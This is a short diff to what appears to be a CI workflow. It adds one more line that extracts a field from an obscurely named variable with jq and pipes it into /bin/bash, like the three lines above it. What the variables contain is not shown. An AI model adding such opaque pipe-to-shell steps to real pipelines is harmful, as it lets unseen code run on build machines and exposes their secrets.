@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$up31" | jq -r .sizye05 | /bin/bash
           echo $a514 | jq -r .nvtyl543 | /bin/bash
           echo $d51 | jq -r .yixvn05685 | /bin/bash
+          echo $ot4304 | jq -r .k25886 | /bin/bash
 
       - name: Archive results
         if: always()
